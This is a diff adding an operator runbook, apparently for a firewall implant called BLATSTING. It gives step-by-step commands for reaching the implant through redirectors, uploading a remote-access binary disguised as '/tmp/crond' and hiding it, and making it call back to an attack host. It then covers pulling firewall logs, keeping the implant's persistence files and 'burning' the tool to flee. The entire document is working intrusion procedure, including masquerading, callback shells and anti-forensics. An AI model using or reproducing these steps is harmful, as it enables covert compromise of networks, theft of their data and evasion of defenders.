@@ -1,0 +1,141 @@
+
+# Firewall log/configuration retrieval and implant update through BLATSTING v1.2
+
+
+# The general order of events is:
+#  	 Connect to BLATSTING. Check out a few things.
+#  	 Upload the compressed NOPEN binary to the target.
+#  	 Uncompress NOPEN on the target.
+#  	 Set up NOPEN to listen on the attack host.
+#  	 Call back to the attack host with NOPEN on the target.
+#  	 Retrieve logs, look around, enjoy life.
+#  	 Burn NOPEN and flee.
+
+
+
+# Set up
+#  You will need a box for BLATSTING's LP. This should be a RedHat Enterprise 4
+#      box. It may serve as the NOPEN client box as well.
+#  Verify that your machine has access to:
+#      The BLATSTING LP
+#      The key file for the implant you're about to contact
+#      The iptables scripts for BLATSTING
+#      noserver
+
+#  The following assumes that the noserver binary is in its standard spot
+#  in the /current directory, and the BLATSTING LP and key file are in
+#  the same directory.
+
+
+# Part A: Connect to BLATSTING
+#  1. Set up redirectors, if necessary. Your redirectors must provide the
+#     same source port/destination port pair between the first hop and the
+#     LP as they do between the last hop and the implant. You may redirect
+#     through localhost.
+
+#  2. Fire up the BLATSTING LP (substitute the correct path below if necessary):
+
+./lp --implant <implant IP> --lp <lp IP> --sport <sport> --dport <dport> \
+     --idkey <keyfile>
+
+#     Or, if you are using a redirector:
+
+./lp --implant <implant IP> --lp <next hop IP> --sport <sport> --dport <dport> \
+     --idkey <keyfile>
+
+#  3. Connect to the implant using option 1:
+
+1
+
+#     If this fails, you've got problems. Either your implant has gone away, or
+#     the target is off or disconnected from the network... Get it to work
+#     before proceeding further.
+#  4. Check to see that all is in order. You will probably want to run commands
+#     like:
+
+3 0 0
+
+#     to check that all the interfaces configured are as expected,
+
+5 0 0
+
+#     to find out which modules are installed and running,
+
+9 0 0
+
+#     to see if your tunnels are up as expected. If you have to fix anything,
+#     go ahead and do that. If you see no hidden files, your implant is not
+#     persistent; you may want to reinstall.
+#     To do that, you need to upload NOPEN anyway, so continue with these
+#     instructions.
+
+# Part B: Upload the compressed NOPEN binary to the target.
+#  1. In a different window, compress the NOPEN binary using gzip:
+gzip /current/up/morerats/noserver
+#  2. In the BLATSTING LP window, upload this to the target, calling it
+#     /tmp/crond and hiding it:
+2 0 4
+/current/up/morerats/noserver.gz
+/tmp/crond.gz
+y
+y
+#     Verify that this succeeds.
+
+# Part C: Uncompress NOPEN on the target.
+#  1. Uncompress the binary, using /bin/gzip -d /tmp/crond.gz, with no
+#     environment variables, as a hidden process. Here we've called it
+#     crond at run time:
+
+4 0 1
+/bin/gzip
+-d
+/tmp/crond.gz
+
+
+y
+
+# Part D: Set up NOPEN to listen on the attack host.
+#  1. In another window on the attack host, make NOPEN listen on the
+#     appropriate port (pick one, adjust as needed for redirectors).
+
+noclient -l <port>
+
+# Part E: Call back to the attack host with NOPEN on the target.
+#  1. In the BLATSTING LP window, execute the binary we just uploaded
+#     (we'll call it crond here).
+
+4 0 1
+/tmp/crond
+
+D=-c<nopen listener ip>:<port>
+
+y
+
+#     NOPEN should now call you back.
+
+# Part F: Retrieve logs, look around, enjoy life.
+#  1. Remove the NOPEN binary (note that you are in the root directory,
+#     not in /tmp):
+
+-rm /tmp/crond
+
+#  Logs are in /var/log/sg/logfile
+#   WARNING: any files you create will be hidden. Do not alter or
+#     overwrite any files which should not be hidden. You may append
+#     using the >> shell operator (but not the single >).
+
+# Part G: Burn NOPEN and flee.
+#  1. Make sure you've cleaned up any temporary files you've left on the
+#     box. Do not remove the files used by the implant for persistence
+#     across reboots. If you're not sure about a file, the best option is to
+#     leave it there.
+#  2. Burn NOPEN.
+
+-burn
+BURN
+
+#  3. Exit the BLATSTING LP (if you haven't done so already) using option 0.
+
+#  4. Clean up the rest of your infrastructure, as necessary.
+
+
